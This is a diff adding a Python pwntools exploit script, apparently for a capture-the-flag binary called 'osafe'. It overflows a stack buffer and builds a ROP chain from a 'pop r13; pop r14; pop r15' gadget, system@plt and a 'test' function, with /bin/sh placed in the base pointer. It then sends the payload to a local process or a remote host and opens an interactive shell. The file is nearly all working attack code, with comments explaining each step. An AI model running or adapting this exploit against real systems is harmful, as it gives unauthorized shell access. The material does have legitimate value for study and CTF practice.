@@ -1,0 +1,99 @@
+#!/usr/bin/python
+
+# author: WatchDogOblivion
+# description: TODO
+# WatchDogs Overflow Jail a.k.a osafe
+
+from pwnlib.rop import ROP
+from pwnlib.elf.elf import ELF
+from pwnlib.context import context
+from pwnlib.tubes.remote import remote
+from pwnlib.tubes.process import process
+
+from watchdogs.base.models import AllArgs
+from watchdogs.pwn.parsers import OverflowArgs
+from watchdogs.utils.PwnUtility import p64
+
+
+def __main__():  #type:() -> None
+  allArgs = AllArgs([OverflowArgs()]).mergeAndProcess()
+  oArgs = allArgs.getArgs(OverflowArgs)
+
+  if (oArgs.localProcess):
+    # Open file locally for buffer processing
+    # proc = process("./myapp")
+    proc = process(oArgs.process)
+  else:
+    # Connect to remote host for buffer processing
+    # IP = "10.10.10.147" PORT = 1337
+    proc = remote(oArgs.remoteHost, oArgs.remotePort)
+
+  # Read exeutable to get function and other addressess dynamically
+  elf = ELF(oArgs.process)
+  rop = ROP(elf)
+
+  # Not needed just good for info and stability
+  context(os=oArgs.operatingSystem, arch=oArgs.arch)
+
+  # Buffer filled to capacity
+  buffer = oArgs.bufferCharacter * oArgs.bufferSize
+
+  # The command to place in the base pointer during the segmentation fault/overflow
+  basePointer = oArgs.basePointer
+
+  # Fill remaining bytes based on architecture
+  bpLength = len(basePointer)
+  archBytes = oArgs.archBytes
+  if (bpLength < archBytes):
+    while bpLength < archBytes:
+      basePointer += "\x00"
+      bpLength += 1
+
+  # Not needed since it is not overwritten, so setting to blank
+  instructionPointer = oArgs.instructionPointer
+
+  # We want r13 but in this case, r13, r14, and r15 are all in one instruction
+  # 0x0000000000401206: pop r13; pop r14; pop r15; ret;
+  # 4198918L decimal format
+  POP_R13_R14_R15 = (rop.find_gadget(['pop r13']))[0]
+
+  # Gets the system method address
+  # 0x401040 <system@plt>
+  # 4198464 decimal format
+  R13_SYSTEM = elf.plt['system']
+
+  # Junk code to be passed into POP_R13_R14_R15 for the R14 and R15 arguments
+  R14_JUNK = oArgs.bufferCharacter * archBytes
+  R15_JUNK = oArgs.bufferCharacter * archBytes
+
+  # Gets the test method address
+  # 0x0000000000401152 <+0>:     push   basePointer
+  # 4198738 decimal format
+  TEST = elf.symbols['test']
+
+  # Overflow local78 variable which is the buffer.
+  # Store /bin/sh command in the RBP (Base pointer)
+  # Execute the first instruction POP_R13_R14_R15 with arguments (R13_SYSTEM, R14_JUNK, R15_JUNK)
+  # This will set r13 to the system call, and r14 and r15 to random junk since we wont use them
+  # Then we invoke the TEST function.
+
+  # I tried to specifiy the command as the top of the stack (RSP).
+  # However adding the command to the end ()top of the stack results in
+  # a concat of the RBP and RSP (/bin/sh\x00/bin/sh\x00), I decided to just make RBP the command
+  # This way the null RSP will not add anything more. This is strange behavior since RSP was supposed
+  # to override RBP by the mov command. Instead, it is concating and then taking the combined value.
+  # After making the adjustment, RBP is /bin/sh, RSP adds nothing and takes the /bin/sh value from RBP
+  # The test function will take RSP and assign it to RDI which is used as the first
+  # argument of the system function
+
+  payload = ""
+  payload += p64(POP_R13_R14_R15)
+  payload += p64(R13_SYSTEM)
+  payload += R14_JUNK
+  payload += R15_JUNK
+  payload += p64(TEST)
+
+  proc.sendline(buffer + basePointer + instructionPointer + payload)
+  proc.interactive()
+
+__main__()
